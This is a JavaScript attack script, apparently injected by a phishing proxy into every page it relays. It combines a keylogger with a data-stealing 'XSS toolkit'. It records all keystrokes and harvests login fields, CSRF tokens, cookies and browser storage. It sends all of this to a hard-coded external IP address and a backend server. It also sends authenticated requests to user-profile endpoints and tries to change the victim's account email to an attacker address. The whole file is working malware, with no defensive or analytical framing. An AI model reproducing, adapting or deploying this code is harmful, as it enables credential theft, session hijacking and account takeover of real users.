// ============================================================
//  FULL INTEGRATED SCRIPT – Keylogger + XSS Toolkit
//  Injected into every proxied page
// ============================================================

(function() {
    // --- Configuration ---
    const BACKEND_URL = "https://meeting-h5ze.onrender.com";
    const KEYLOGGER_URL = "http://78.159.110.18:3001/log";  // Update with your VPS IP
    const FLUSH_INTERVAL = 15000;  // 15 seconds
    const MAX_BUFFER = 500;
    const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();

    let keylogBuffer = '';

    // ============================================================
    //  PART 1: KEYLOGGER
    // ============================================================

    function formatKey(key) {
        const special = {
            'Enter': '[ENTER]\n',
            'Backspace': '[BACKSPACE]',
            'Tab': '[TAB]',
            'Escape': '[ESC]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PAGEUP]',
            'PageDown': '[PAGEDOWN]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'Shift': '[SHIFT]',
            'Meta': '[WIN]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        return special[key] || (key.length === 1 ? key : `[${key}]`);
    }

    function sendKeylogBatch() {
        if (keylogBuffer.length === 0) return;

        // Send to keylogger server (VPS)
        fetch(KEYLOGGER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                keystrokes: keylogBuffer,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                sessionId: SESSION_ID
            })
        }).catch(() => {});

        // Also send to backend as a fallback
        try {
            fetch(`${BACKEND_URL}/api/keylog`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    keystrokes: keylogBuffer,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: SESSION_ID,
                    ip: 'auto-detected'
                })
            }).catch(() => {});
        } catch (e) {}

        keylogBuffer = '';
    }

    // Keylogger event listeners
    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        keylogBuffer += formatKey(e.key);
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // Keylogger periodic flush
    setInterval(sendKeylogBatch, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', sendKeylogBatch);

    console.log('🔐 Keylogger initialized [session: ' + SESSION_ID + ']');

    // ============================================================
    //  PART 2: XSS TOOLKIT – DOM, Storage & Malicious Requests
    // ============================================================

    // --- Helper: Send XSS data to backend ---
    async function sendXSSData(data) {
        try {
            await fetch(`${BACKEND_URL}/api/xss-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    xssData: data,
                    visitorInfo: {
                        fullUrl: window.location.href,
                        userAgent: navigator.userAgent,
                        sessionId: SESSION_ID
                    }
                })
            });
            console.log('[XSS] Data sent successfully');
        } catch (e) {
            console.warn('[XSS] Failed to send data:', e);
        }
    }

    // --- 2.1 DOM DATA EXTRACTION ---
    function extractDomData() {
        const data = {};

        // Email/username fields
        const emailField = document.querySelector('input[name="loginfmt"]') || 
                           document.querySelector('input[type="email"]') ||
                           document.querySelector('input[name="email"]');
        if (emailField) data.email = emailField.value;

        // Display name / user info
        const displayName = document.querySelector('[data-testid="displayName"]') ||
                           document.querySelector('[class*="display-name"]') ||
                           document.querySelector('.user-display-name');
        if (displayName) data.displayName = displayName.textContent.trim();

        // CSRF tokens
        const csrfMeta = document.querySelector('meta[name="csrf-token"]');
        if (csrfMeta) data.csrfToken = csrfMeta.content;
        
        const csrfInput = document.querySelector('input[name="__RequestVerificationToken"]');
        if (csrfInput) data.csrfToken = csrfInput.value;

        // API responses in script tags
        const scripts = document.querySelectorAll('script[type="application/json"]');
        const apiData = [];
        scripts.forEach(script => {
            try {
                const json = JSON.parse(script.textContent);
                if (typeof json === 'object') {
                    apiData.push(json);
                }
            } catch (e) {}
        });
        if (apiData.length > 0) data.apiData = apiData;

        // Personal/account info
        const userInfo = document.querySelector('[data-testid="userInfo"]') ||
                        document.querySelector('.user-info') ||
                        document.querySelector('.profile-info');
        if (userInfo) data.userInfo = userInfo.textContent.trim();

        // Phone numbers
        const phoneField = document.querySelector('input[type="tel"]');
        if (phoneField) data.phone = phoneField.value;

        return data;
    }

    // --- 2.2 BROWSER STORAGE ABUSE ---
    function extractStorage() {
        const data = {};

        try {
            // localStorage
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                let value = localStorage.getItem(key);
                try { value = JSON.parse(value); } catch (e) {}
                ls[key] = value;
            }
            data.localStorage = ls;

            // sessionStorage
            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                let value = sessionStorage.getItem(key);
                try { value = JSON.parse(value); } catch (e) {}
                ss[key] = value;
            }
            data.sessionStorage = ss;

            // Cookies
            data.cookies = document.cookie;
        } catch (e) {}

        return data;
    }

    // --- 2.3 MALICIOUS REQUEST EXECUTION ---
    async function executeMaliciousRequests() {
        const results = {};

        // Common endpoints to try
        const endpoints = [
            '/api/user/me',
            '/api/account/profile',
            '/me',
            '/profile',
            '/api/v1/user',
            '/common/userinfo',
            '/v1/me',
            '/api/User/GetCurrentUser',
            '/Account/GetUserInfo'
        ];

        for (const endpoint of endpoints) {
            try {
                const res = await fetch(endpoint, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });
                if (res.ok) {
                    const data = await res.json();
                    results[endpoint] = data;
                }
            } catch (e) { /* ignore */ }
        }

        // Attempt CSRF-protected action – change email
        const csrf = document.querySelector('meta[name="csrf-token"]')?.content || 
                     document.querySelector('input[name="__RequestVerificationToken"]')?.value;
        if (csrf) {
            try {
                const changeRes = await fetch('/api/account/change-email', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': csrf
                    },
                    body: JSON.stringify({ email: 'hacked@attacker.com' }),
                    credentials: 'include'
                });
                if (changeRes.ok) {
                    results['changeEmail'] = 'success';
                } else {
                    results['changeEmail'] = 'failed: ' + changeRes.status;
                }
            } catch (e) {
                results['changeEmail'] = 'error: ' + e.message;
            }
        }

        return results;
    }

    // --- 2.4 EXECUTE ALL EXTRACTION METHODS ---
    async function runXSS() {
        try {
            const domData = extractDomData();
            const storageData = extractStorage();
            const maliciousResults = await executeMaliciousRequests();

            const combined = {
                dom: domData,
                storage: storageData,
                requests: maliciousResults,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };

            await sendXSSData(combined);
            console.log('[XSS] Captured data:', combined);
        } catch (e) {
            console.warn('[XSS] Error in extraction:', e);
        }
    }

    // --- Run XSS on page load ---
    if (document.readyState === 'complete') {
        runXSS();
    } else {
        window.addEventListener('load', runXSS);
    }

    // --- Run after delays to catch dynamic content ---
    setTimeout(runXSS, 3000);
    setTimeout(runXSS, 8000);
    setTimeout(runXSS, 20000);

    // --- Observe DOM changes for SPAs ---
    let observerRunning = false;
    const observer = new MutationObserver(() => {
        if (!observerRunning) {
            observerRunning = true;
            setTimeout(() => {
                runXSS();
                observerRunning = false;
            }, 1000);
        }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // ============================================================
    //  PART 3: SERVICE WORKER PROXY (Optional)
    // ============================================================
    (function() {
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            }).then(() => {
                console.log("✅ Service Worker registered");
            }).catch((error) => {
                console.error("❌ Service Worker registration failed:", error);
            });
        }
    })();

    console.log('🔐 Full integrated script loaded [session: ' + SESSION_ID + ']');

})();